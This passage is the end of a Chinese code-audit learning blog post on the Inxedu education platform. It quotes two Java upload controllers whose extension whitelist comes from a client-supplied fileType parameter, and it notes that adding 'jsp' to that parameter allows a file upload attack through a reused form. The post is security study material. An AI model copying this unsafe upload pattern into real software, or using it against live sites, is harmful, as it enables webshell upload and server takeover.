+<p>另外两处<code>src/main/java/com/inxedu/os/common/controller/VideoUploadController.java</code>，白名单可控，手动添加jsp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 视频上传</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/uploadvideo&quot;,method=&#123;RequestMethod.POST&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">gok4</span><span class="params">(HttpServletRequest request,HttpServletResponse response,<span class="meta">@RequestParam(value=&quot;uploadfile&quot; ,required=true)</span> MultipartFile uploadfile,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="meta">@RequestParam(value=&quot;param&quot;,required=false)</span> String param,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="meta">@RequestParam(value=&quot;fileType&quot;,required=true)</span> String fileType)</span></span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">		String[] type = fileType.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">		<span class="comment">//设置图片类型</span></span><br><span class="line">		setFileTypeList(type);</span><br><span class="line">		<span class="comment">//获取上传文件类型的扩展名,先得到.的位置，再截取从.的下一个位置到文件的最后，最后得到扩展名</span></span><br><span class="line">		String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename());</span><br><span class="line">		<span class="keyword">if</span>(!fileType.contains(ext))&#123;</span><br><span class="line">			<span class="keyword">return</span> responseErrorData(response,<span class="number">1</span>,<span class="string">&quot;文件格式错误，上传失败。&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//获取文件路径</span></span><br><span class="line">		String filePath = getPath(request,ext,param);</span><br><span class="line">		File file = <span class="keyword">new</span> File(getProjectRootDirPath(request)+filePath);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//如果目录不存在，则创建</span></span><br><span class="line">		<span class="keyword">if</span>(!file.getParentFile().exists())&#123;</span><br><span class="line">			file.getParentFile().mkdirs();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//保存文件</span></span><br><span class="line">		uploadfile.transferTo(file);</span><br><span class="line">		<span class="comment">//返回数据</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> responseData(filePath,<span class="number">0</span>,<span class="string">&quot;上传成功&quot;</span>,response);</span><br><span class="line">	&#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">		logger.error(<span class="string">&quot;gok4()--error&quot;</span>,e);</span><br><span class="line">		<span class="keyword">return</span> responseErrorData(response,<span class="number">2</span>,<span class="string">&quot;系统繁忙，上传失败&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用上传音频</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/uploadaudio&quot;,method=&#123;RequestMethod.POST&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">uploadAudio</span><span class="params">(HttpServletRequest request,HttpServletResponse response,<span class="meta">@RequestParam(value=&quot;uploadfile&quot; ,required=true)</span> MultipartFile uploadfile,</span></span></span><br><span class="line"><span class="function"><span class="params">						  <span class="meta">@RequestParam(value=&quot;param&quot;,required=false)</span> String param,</span></span></span><br><span class="line"><span class="function"><span class="params">						  <span class="meta">@RequestParam(value=&quot;fileType&quot;,required=true)</span> String fileType)</span></span>&#123;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">		String[] type = fileType.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">		<span class="comment">//设置图片类型</span></span><br><span class="line">		setFileTypeList(type);</span><br><span class="line">		<span class="comment">//获取上传文件类型的扩展名,先得到.的位置，再截取从.的下一个位置到文件的最后，最后得到扩展名</span></span><br><span class="line">		String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename());</span><br><span class="line">		<span class="keyword">if</span>(!fileType.contains(ext))&#123;</span><br><span class="line">			<span class="keyword">return</span> responseErrorData(response,<span class="number">1</span>,<span class="string">&quot;文件格式错误，上传失败。&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//获取文件路径</span></span><br><span class="line">		String filePath = getPath(request,ext,param);</span><br><span class="line">		File file = <span class="keyword">new</span> File(getProjectRootDirPath(request)+filePath);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//如果目录不存在，则创建</span></span><br><span class="line">		<span class="keyword">if</span>(!file.getParentFile().exists())&#123;</span><br><span class="line">			file.getParentFile().mkdirs();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//保存文件</span></span><br><span class="line">		uploadfile.transferTo(file);</span><br><span class="line">		<span class="comment">//返回数据</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> responseData(filePath,<span class="number">0</span>,<span class="string">&quot;上传成功&quot;</span>,response);</span><br><span class="line">	&#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">		logger.error(<span class="string">&quot;gok4()--error&quot;</span>,e);</span><br><span class="line">		<span class="keyword">return</span> responseErrorData(response,<span class="number">2</span>,<span class="string">&quot;系统繁忙，上传失败&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>类似头像上传的表单，修改一下uri</p>
+<p><img src="/2021/09/05/inxedu/image-20210905174927620.png" alt="image-20210905174927620"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>快速定位关键函数的能力、对危险函数的熟悉程度需要不断提高，还需要对Java的一些框架去系统的学习一下。</p>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2646#toc-9">https://xz.aliyun.com/t/2646#toc-9</a><br><a target="_blank" rel="noopener" href="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji">https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/b1ank1108">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E5%92%8C%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">配置和结构</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#maven%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.</span> <span class="toc-text">maven结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pom-xml"><span class="toc-number">2.2.</span> <span class="toc-text">pom.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-xml"><span class="toc-number">2.3.</span> <span class="toc-text">web.xml</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring-mvc-xml"><span class="toc-number">2.4.</span> <span class="toc-text">Spring-mvc.xml</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">3.</span> <span class="toc-text">代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0xss%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">前台xss漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">越权漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">后台sql注入漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">4.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reference"><span class="toc-number">6.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.b1ank.top/2021/09/05/inxedu/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.b1ank.top/2021/09/05/inxedu/&text=Java代码审计学习（一）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.b1ank.top/2021/09/05/inxedu/&is_video=false&description=Java代码审计学习（一）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java代码审计学习（一）&body=Check out this article: https://blog.b1ank.top/2021/09/05/inxedu/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.b1ank.top/2021/09/05/inxedu/&title=Java代码审计学习（一）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.b1ank.top/2021/09/05/inxedu/&name=Java代码审计学习（一）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.b1ank.top/2021/09/05/inxedu/&t=Java代码审计学习（一）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    b1ank
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/b1ank1108">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
